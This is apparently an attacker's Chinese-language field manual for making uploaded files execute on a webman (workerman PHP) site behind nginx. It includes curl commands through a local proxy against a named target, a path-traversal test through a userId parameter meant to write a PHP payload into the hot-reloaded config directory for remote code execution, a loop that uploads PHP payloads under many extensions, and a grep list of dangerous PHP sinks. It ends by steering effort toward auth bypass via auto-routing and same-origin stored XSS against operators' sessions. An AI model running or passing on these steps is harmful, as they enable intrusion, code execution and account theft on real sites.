# webman 目标「上传文件如何被执行」全判定手册（含 4 类决定性 oracle）
# 适用：nginx + webman(workerman 常驻 PHP) 架构；无 PHP-FPM 时上传的马直连永不执行，
#       唯一代码执行机制 = webman Monitor 热重载（写进监听目录）。
# 本手册在 example-com 上实测，结论：include/LFI/phar/模板 四路全断（详见 verified_note）。

## 0. 先定架构（决定后面所有方向是否有意义）
```bash
# 有 FastCGI 就会 502/504 或回显执行结果；落到 SPA try_files 说明无 FPM
curl -sS -k --http1.1 -x http://127.0.0.1:7892 --connect-to example.com:443:203.0.113.88:443 https://example.com/example.com   | head -3
curl -sS -k --http1.1 -x http://127.0.0.1:7892 --connect-to example.com:443:203.0.113.88:443 https://example.com/phpinfo.php | head -3
# path-info 形态也要试（老 nginx + fastgi_split_path_info 会执行）
#   /uploads/x.php7/   /uploads/x.php7%20   /uploads/x.php7.   /uploads/x.php7/x.jpg   /uploads/x.php/
```
无 FPM ⇒ 只剩下的执行机制是 Monitor 热重载，卡点是「写出」。

## 1. Monitor 监听目录（webman 默认 config/process.php，本项目实测）
监听：`app/`、`config/`、`process/`、`support/`、`resource/`、`.env`、`plugin/*/{app,config,api}`
扩展名：`php, html, htm, env`；命中 → `php -l` 通过 → `posix_kill(master, SIGUSR1)` → worker 重启
→ `support/bootstrap.php` 重跑 → **`Config::load` 会 include 配置文件**（把 payload 写进 `config/` 即执行）。
> 所以判定口径不是「能不能触发」，而是「**能不能写进这 9 个位置之一**」。上传目录（public/uploads、
> plugin/admin/public、runtime）**一个都不在监听列表**。

## 2. 上传落盘路径可穿越性 oracle（本目标否决）
三个上传点里唯一进入文件名的是 `$userId`；`$ext = UploadFile::getUploadExtension() = pathinfo($uploadName, PATHINFO_EXTENSION)`
**不可能含 `/`**，所以只能从 `$userId` 穿越。
决定性测试（1 个请求即可判定 webman 的 `$request->userId` 是否透传请求参数）：
```bash
curl -sS -k --http1.1 -x http://127.0.0.1:7892 --connect-to example.com:443:203.0.113.88:443 \
  "https://example.com/api/withdraw/uploadQrCode?userId=1"     # 自动路由=无 AuthMiddleware
```
- 返回业务错误（`400 请选择要上传的图片`）= **透传成功** ⇒ `$userId` 可控 ⇒ `../../../config/x_<uniqid>.php` 写进监听目录 = **RCE**。
- 返回 `401 请先登录` = 未透传（本目标实测结果）⇒ 穿越关闭。
自动路由形式 = `/{controller}/{action}`，控制器名首字母大写 + `Controller` 后缀，**不带路由级中间件**（可先拿它绕鉴权读数据）。

## 3. nginx `/uploads` 扩展名反解析名单测绘（给 XSS/投递线用）
逐扩展名上传同内容 `<?php echo "MARK:".md5(777); ?>` 再 GET 回读，记录 status+Content-Type：
```bash
for e in jpg html svg txt php phar phtml php5 php7 php8 inc; do
  curl -sS -k --http1.1 -x http://127.0.0.1:7892 --connect-to example.com:443:203.0.113.88:443 \
    -H "Authorization: Bearer $TOK" -F "file=@payload;filename=x.$e;type=image/jpeg" \
    https://example.com/api/v1/withdraw/upload-qrcode
done
```
本目标结果：**只需拦 `php|phar|phtml`**，`.php5/.php7/.php8/.inc` 全部 **200 + application/octet-stream + 原样内容**；
`.html`→`text/html`、`.svg`→`image/svg+xml`、`.jpg`→`image/jpeg` 全部原样（同源存储型 XSS 弹药）。
注意上传点有频率限制：约 10 次后 `{"code":429,"message":"请求过于频繁，请稍后 120 秒再试"}`。

## 4. 静态审计 sink 清单（对 PHP 项目按序 grep，逐个看上下文，不要只看命中行）
```
include|include_once|require|require_once        # 逐个确认路径来源是否来自 $request
eval\(|assert\(|create_function|call_user_func|call_user_func_array|forward_static_call|preg_replace
file_get_contents|readfile|fopen|file_exists|is_file|is_dir|filesize|unlink|rename|copy|move_uploaded_file
ZipArchive|getimagesize|md5_file|highlight_file|show_source|SplFileObject|scandir|glob|opendir|parse_ini_file
unserialize                        # 看有没有 allowed_classes=false；没有则查 vendor gadget
view\(|raw_view\(|render\(|template|trans\(|lang\(     # 第一个参数是不是字面量
file_put_contents|fwrite           # ★ 最高价值：看落点是否在 Monitor 监听目录
```
**易误判为洞、实为白名单的两处典型**（本目标都出现，避免重复挖）：
- `call_user_func([$this, $format_function], ...)` 而 `$format_function = $methods[$format] ?? 'formatNormal'` —— `$methods` 是硬编码映射表 ⇒ 不可控。
- `include $file` 前有 `is_file(base_path()."/plugin/$name/config/app.php")` —— 尾部固定拼接 `config/app.php`，`$name` 加多少 `../` 都到不了任意文件。

## 5. 收口建议
本路线（include/LFI/phar/模板 → RCE）对纯 webman（无 FPM）目标基本必断，**别把预算花在重测上**；
把精力放在 ① 绕过鉴权读数据/写 DB（自动路由、命名空间错配）② 上传点做同源 XSS 打运营侧会话 ③ 换 vhost/换系统。